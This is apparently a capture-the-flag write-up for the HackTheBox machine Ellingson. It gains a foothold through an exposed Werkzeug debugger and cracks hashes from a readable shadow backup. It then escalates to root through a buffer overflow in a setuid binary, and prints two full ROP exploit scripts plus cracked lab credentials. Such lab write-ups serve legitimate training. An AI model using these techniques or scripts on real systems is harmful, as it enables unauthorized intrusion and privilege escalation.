## Enumeration
I use masscan and nmap for a quick scan, here i use a script which create a keepnote page report from the scan, found it [here](https://github.com/roughiz/EnumNeTKeepNoteReportCreator/blob/master/keepNoteScanNetReportCreator.sh).

We have two open ports :
```
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
| 256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_ 256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (EdDSA)
80/tcp open http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
In the http port we have a site "http://10.10.10.139/index" of the compagny "EMc" , i found some useful infomation like "usernames" of some members. i also found some articles in the site with useful information about the security, and advices about users passwords.
#### Users 
hal
margo
eugene
duke

![usernames](https://github.com/roughiz/Ellingson-walktrough/blob/master/users.png)

#### Common passwords
![passwords](https://github.com/roughiz/Ellingson-walktrough/blob/master/passwords.png)

In http://10.10.10.139/articles/3 we have passwords :

Love
Secret 
Sex
God

### Werkzeug Debugger

Playing with the request, if we put an article id not in the range [0..3], we have an error page, and from it we can easily understand that the server use python flask web app framewok,and the debug is caught by "Werkzeug".
Werkzeug is one of the most popular WSGI utility frameworks for Python. It simplifies the handling of HTTP connections within your Python application but also provides a powerful debugger that permits one to execute code from within the browser.
With some research i found an [article](https://blog.keigher.ca/2014/12/remote-code-execution-on-misconfigured.html) about how to perform an RCE on misconfigured systems using Werkzeug. here the developer forgot to disable the debugger in production.

![debug](https://github.com/roughiz/Ellingson-walktrough/blob/master/debug.png)

## Caught ssh shell
All my tests to perform an RCE from the debbug console fails, so i tried to list directories from the box to know if we have accees to a user home :

![list_directories](https://github.com/roughiz/Ellingson-walktrough/blob/master/listdir.png)

The web app is running as "hal" user, and we can trought the debuger console, write in the "/home/hal/.ssh/authorized_keys" and add our key in the first stage. and use this key to authenticate with ssh.

Firstly i create an ssh key (i don't want to put my own key in the box!!) :
``` 
$ ssh-keygen
.....
$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEWNYCu7gGkGOs0XzaF4sYyjdOGBsbSk4FZCelytufrizb48izgtyL+5RCASLNWWIvPKXNoqms8JKOMPyw8gaufqF4L+mxVsLgkE39hPpch2pY3/Ps+i5mmjmEZ80MOX1hzjfKAB0vS5N7YCh09rMWxWMyzMPOfQsqB8ETLQDtvMKoURkxp3NA9fQTE74Kcrk08xP2CjBop1T/NvFasGeX21r8X8RnI+N3cnML0H5jwlfNbfnM0E0FMgX1mw3iFTfMkUGz0y8tIBeHhcaviwxsZWLeQ0R7xT5uh0VFNsgr/Fj4LRfH8HnSbAJNQOAmahzdmZIYEs5ca1PSSPq7Vtgj
```

Now, tried to write the public key created before into "authorized_keys" like :
```
f = open('/home/hal/.ssh/authorized_keys', 'a')
data= '\n\nssh-rsa
AAAAB3NzaC1yc2EAAAADAQABAAABAQDEWNYCu7gGkGOs0XzaF4sYyjdOGBsbSk4FZCelytufrizb48izgtyL+5RCASLNWWIvPKXNoqms8JKOMPyw8gaufqF4L+mxVsLgkE39hPpch2pY3/Ps+i5mmjmEZ80MOX1hzjfKAB0vS5N7YCh09rMWxWMyzMPOfQsqB8ETLQDtvMKoURkxp3NA9fQTE74Kcrk08xP2CjBop1T/NvFasGeX21r8X8RnI+N3cnML0H5jwlfNbfnM0E0FMgX1mw3iFTfMkUGz0y8tIBeHhcaviwxsZWLeQ0R7xT5uh0VFNsgr/Fj4LRfH8HnSbAJNQOAmahzdmZIYEs5ca1PSSPq7Vtgj'
f.write(data)
f.close()
```

And finnaly use ssh to authenticate as hal like :
```
ssh -v -i ./id_rsa hal@10.10.10.139
```
![hal_shell](https://github.com/roughiz/Ellingson-walktrough/blob/master/hal_shell.png)

## Privilege Escalation

I didn't find the user.txt in the "hal" home directory, so i have to find how to authenticate as an other user to have my first flag, let's enumerate the box with my prefer linux priv escalation python [script](https://github.com/sleventyeleven/linuxprivchecker).

First i transfer the script with scp like :
```
$ scp -i ./ssh/id_rsa privsecchecker.py   hal@10.10.10.139:/tmp/ 
```
#### Setuid binary 

We have a strange setuid binary, but i can't execute it as hal user. let's try to found an other user's credentials.
```
[+] SUID/SGID Files and Directories
    -rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
    -rwxr-sr-x 1 root mail 10952 Nov  7  2017 /usr/bin/dotlock.mailutils
    -rwsr-xr-x 1 root root 40344 Jan 25  2018 /usr/bin/newgrp
    -rwxr-sr-x 1 root tty 14328 Jan 17  2018 /usr/bin/bsd-write
    -rwsr-xr-x 1 root root 22520 Jul 13  2018 /usr/bin/pkexec
    -rwxr-sr-x 1 root ssh 362640 Feb 10  2018 /usr/bin/ssh-agent
    -rws------ 1 root root 59640 Jan 25  2018 /usr/bin/passwd
    -rwxr-sr-x 1 root crontab 39352 Nov 16  2017 /usr/bin/crontab
    -rwsr-xr-x 1 root root 75824 Jan 25  2018 /usr/bin/gpasswd
    -rwxr-sr-x 1 root shadow 22808 Jan 25  2018 /usr/bin/expiry
    -rwsr-xr-x 1 root root 18056 Mar  9 21:04 [/usr/bin/garbage]
```

With some enumeration i found in "/var/backups" a shadow.bak file with read right for group "adm", and the user hal belongs of this group. 

![shadow_rights](https://github.com/roughiz/Ellingson-walktrough/blob/master/shadow.png)

##### Nota: 
Think to revert machine before exploit, some users change files rights !!!
```
$ cat shadow.bak
...
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::

```
Here we have some users hashes, so the next step is to crack theses hashes.

```
$ cat shadow
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
```

Firstly i tried to crack theses hashees with john with the default dictionary "rockyou", but it will take some days, so i have to create a new dictionary from "rockyou" with passwords informations caught before, "... the most common passwords are. Love, Secret, Sex and God"

#### Create a new dictionary
```
$ grep  -i  "Love\|Secret\|sex\|God" rockyou.txt > wordlist
```
#### Crack hashes
```
$ john --wordlist=wordlist shadow
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Remaining 2 password hashes with 2 different salts
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads

theplague:password123:1000:1000:Eugene Belford:/home/theplague:/bin/bash
margo:iamgod$08:1002:1002:,,,:/home/margo:/bin/bash
```

#### Passwords
password123      (theplague)

iamgod$08        (margo)

The password for user "theplague" dosen't work, but password of margo worked great and i have the user flag:
```
margo@ellingson:~$ cat user.txt | wc -c
33
```

### On the road to root

Here i'm in the last step to be root, let's execute the binary foud before :
```
$ margo@ellingson:~$ /usr/bin/garbage 
Enter access password: 
```
the binary asks for a password, ok let's see if i can found some useful information.
strings command did it fine and i found the password hardcoded in the binary :
```
$ strings /usr/bin/garbage
Balance is $%d
%llx
%lld
/var/secret/accessfile.txt
user: %lu cleared to access this application
user: %lu not authorized to access this application
User is not authorized to access this application. This attempt has been logged.
error
Enter access password: 
[N3veRF3@r1iSh3r3!]
access granted.
access denied.
[+] W0rM || Control Application
[+] ---------------------------
Select Option
1: Check Balance
2: Launch
3: Cancel
4: Exit
%d%*c
Unknown option
;*3$"
```
The password is "N3veRF3@r1iSh3r3!", let's use it:

```
/usr/bin/garbage 
Enter access password: N3veRF3@r1iSh3r3!

access granted.
[+] W0rM || Control Application
[+] ---------------------------
Select Option
1: Check Balance
2: Launch
3: Cancel
4: Exit
> 2
Row Row Row Your Boat...
> 1
Balance is $1337
> 3
```
I uploaded the binary locally, and after digging for some time, it appears that the binary has a buffer overflow, we can see it in gdb :

```
gdb-peda$ disassemble auth
   0x0000000000401558 <+69>:	lea    rax,[rbp-0x80]
   0x000000000040155c <+73>:	mov    rdi,rax
   0x000000000040155f <+76>:	mov    eax,0x0
   0x0000000000401564 <+81>:	call   0x401100 <gets@plt>
   0x0000000000401569 <+86>:	mov    edi,0xa
   0x000000000040156e <+91>:	call   0x401030 <putchar@plt>
   0x0000000000401573 <+96>:	lea    rax,[rbp-0x80]
   0x0000000000401577 <+100>:	lea    rsi,[rip+0xbe1]        # 0x40215f
   0x000000000040157e <+107>:	mov    rdi,rax
   0x0000000000401581 <+110>:	call   0x4010e0 <strcmp@plt>
   0x0000000000401586 <+115>:	test   eax,eax
   0x0000000000401588 <+117>:	jne    0x401606 <auth+243>
   0x000000000040158a <+119>:	lea    rax,[rbp-0xf0]

```
In the "auth" function, they use "gets" function which it's not safe to use, because it does not check the array bound.
and we can also see that in the lines after they use "strcmp" to compare the user input [rbp-0x80] and the password hardcoded in [rip+0xbe1]

#### Nota :
In x86-64, to call a function, the  program should place the first six integer or pointer parameters in the registers %rdi, %rsi, %rdx, %rcx, %r8, and %r9; subsequent parameters (or parameters larger than
64 bits) should be pushed onto the stack.
and the register %rsp is used as the stack pointer, a pointer to the topmost element in the stack.

[x86-64 cheatsheet](http://www.cs.tufts.edu/comp/181/x64_cheatsheet.pdf)
Here per example the binary compare the two strings like :
###### strcmp($rdi,$rsi)

#### Segmentation Fault

[SegFault](https://github.com/roughiz/Ellingson-walktrough/blob/master/segfault.png)

Let's find how much caracters i need to have a segfault : 

![pattern](https://github.com/roughiz/Ellingson-walktrough/blob/master/pattern.png)
![rsp](https://github.com/roughiz/Ellingson-walktrough/blob/master/rsp.png)
![junk](https://github.com/roughiz/Ellingson-walktrough/blob/master/junk.png)

#### Binary compiled flag
Let's check how the binary was compiled and if ASLR is enabled in this box.
I used the script [checksec](https://github.com/RobinDavid/checksec) to test executable properties like :
![checksec_analyse](https://github.com/roughiz/Ellingson-walktrough/blob/master/checksec.png)

#### ASLR 
```
cat /proc/sys/kernel/randomize_va_space
2
```

```
The following values are supported:

0 – No randomization. Everything is static.
1 – Conservative randomization. Shared libraries, stack, mmap(), VDSO and heap are randomized.
2 – Full randomization. In addition to elements listed in the previous point, memory managed through brk() is also randomized.
```

Here the NX is enabled so we can't execute any shellcode in the stack, also ASLR is enabled so we need to do some fancy ROP. Our ROP strategy is below:
- Leak a libc address via ROPing to puts() with puts as the parameter.
   - This will return the address of puts in the libc the binary is using.
   - We can calculate the libc base address since we were given their libc in the problem (leaked_libc_read_address - original_libc_from_challenge = base_libc_on_server)
- Call main so we can re-exploit with the knowledge of the libc base address.
##### In the first stage : 
```
# Be sure to add the zeros that we miss due to string read
# Grab the first 6 bytes of our output buffer and 
leaked_puts = p.recv()[:6].strip().ljust(8, '\x00') 
leaked_puts = struct.unpack('<Q', leaked_puts)[0]
.....
offset = leaked_puts - libc_put
```
##### In the second stage
call setuid(0) to excute the shell as user root, and call the fucntion execve("/bin/sh",Null,Null) 

###### Nota :
Libc contains some security mitigations where when you call system() with /bin/sh as argument it drops the privileges (if euid != uid).

we also have to found address of "puts" "/bin/sh" "execve" "setuid", and add the "offset" to address of fucntion in libc, for example :

```
readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep puts 
libc_sh =0x1b3e9a
```

```
setuid = offset +libc_setuid
```
##### Asm code :
The asm code of c code :
setuid(0);
execve("/bin/sh",Null,Null);

```
pop rdi; ret # frist arg
0x0
call adresse_of_setuid
pop rdi; ret
adress_of(/bin/sh)
pop rsi; ret  # second arg Null(0x00)
0x0
pop rdx; ret # third arg Null(0x00)
0x00
call adress_of_execve
```

I used the python package pwntools to interact with the binary in the remote machine via ssh like :

```
s = ssh(host='Ellingson.htb',user='margo',password='iamgod$08')
p= s.process('/usr/bin/garbage')
````

### Exploit [code](https://github.com/roughiz/Ellingson-walktrough/blob/master/exploit_manu.py) (manually)
```
import struct, binascii
from pwn import * 
s = ssh(host='Ellingson.htb',user='margo',password='iamgod$08')
p= s.process('/usr/bin/garbage')

# Stage 1 Leak static adressess in the binary : objdump -D /usr/bin/garbage | grep (puts/main)
#401050:	ff 25 d2 2f 00 00    	jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
# for rdi : rp-lin-x64 -f garbage -r 1 | grep "pop rdi"
plt_main= struct.pack('<Q', 0x401619) # main
plt_put = struct.pack('<Q', 0x401050)
got_put = struct.pack('<Q', 0x404028)
pop_rdi = struct.pack('<Q', 0x0040179b) 

junk = "A"*136 

payload = junk+pop_rdi+got_put+plt_put +plt_main  #we print the adsress of fct puts from libc after been charged and with a random offset, and we back to main again 
p.recvuntil("password:")
p.sendline(payload)
p.recvuntil("denied.\n") 

leaked_puts = p.recv()[:6].strip().ljust(8, '\x00') # error take me a lot of time, i have a wrong leaked addresse cause , it take 8 byte and adresse was about 6 byte so i have to read just the first 6 bytes
print("Leaked puts@GLIBCL: "+ str(leaked_puts))
leaked_puts = struct.unpack('<Q', leaked_puts)[0]


# stage 2 
# adresse of puts of GLIBC from Libc:  readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep puts  , and the same with system
libc_put = 0x809c0
libc_setuid=0xe5970
libc_execve=0xe4e30
# for /bin/sh : strings -a -t x /lib/x86_64-linux-gnu/libc-2.27.so | grep /bin/sh
libc_sh =0x1b3e9a

# rp-lin-x64 -f libc_fromremote.so --unique -r 1 | grep  "pop rdx"
libc_pop_rdx = 0x1b96
libc_pop_rsi = 0x23e6a

offset = leaked_puts - libc_put
sh = offset+libc_sh
setuid = offset +libc_setuid
execve = offset + libc_execve
pop_rdx= offset+libc_pop_rdx
pop_rsi= offset+libc_pop_rsi

# setuid(0)
# execve("/bin/sh",Null,Null)
second_rop= pop_rdi    # place argument of setuid() in the register rdi 
second_rop+=struct.pack('<Q', 0x0000000000000000)
second_rop+=struct.pack('<Q', setuid) # setuid fct 
second_rop+= pop_rdi    # place first arg  of execve() in the register rdi 
second_rop+=struct.pack('<Q', sh) # address of "/bin/sh"
second_rop+=struct.pack('<Q',pop_rdx)  # second arg
second_rop+=struct.pack('<Q', 0x0000000000000000)
second_rop+=struct.pack('<Q',pop_rsi)  # third arg
second_rop+=struct.pack('<Q', 0x0000000000000000) 
second_rop+=struct.pack('<Q', execve)
# final payload 
payload = junk + second_rop  
p.sendline(payload)
p.recvuntil("denied.")
p.interactive()
```

### Exploit [code](https://github.com/roughiz/Ellingson-walktrough/blob/master/exploit_auto.py) (auto)
We can also perform this attack using ROP and ELF Classes from pwntools, which search adress and also have some functions like "call" or "system" 

```
from pwn import *
import struct
import binascii
context(os="linux", arch="amd64")
s = ssh(host='Ellingson.htb',user='margo',password='iamgod$08')
p= s.process('/usr/bin/garbage')
#context.log_level = 'DEBUG'

garbage= ELF('garbage')
rop = ROP(garbage)
libc = ELF('libc_fromremote.so') #the libc used in the box(ldd /usr/bin/garbage)
junk = "A"*136

# we try to use rop from pwntools to found the leaked_put (real adresse) theses adrsses are static in the binary 
rop.puts(garbage.got['puts'])
rop.call(garbage.symbols['main'])
log.info('stage 1 ROP Chain :' + rop.dump())

payload= junk + str(rop)
p.recvuntil("password:")
p.sendline(payload)
p.recvuntil("denied.\n") 

leaked_puts = p.recv()[:6].strip().ljust(8, '\x00') # error take me a lot of time, i have a wrong leaked addresse cause , it take 8 byte and adresse was about 6 byte so i have to read just the first 6 bytes
log.success("Leaked puts@GLIBCL: "+ str(leaked_puts))
leaked_puts = u64(leaked_puts)

# stage 2 
libc.address  = leaked_puts - libc.symbols['puts']
rop2= ROP(libc)
rop2.call(libc.symbols['setuid'],[0]) #setuid(0)
rop2.call(libc.symbols['execve'], [next(libc.search('/bin/sh\x00')), 0, 0]) # execve("/bin/sh",Null,Null)
log.info('Stage 2 ROP cHAIN :\N'+rop2.dump())
payload = junk +str(rop2)
p.sendline(payload)
p.recvuntil("denied.")
p.interactive()
```

## Root dance
![root](https://github.com/roughiz/Ellingson-walktrough/blob/master/root.png)



















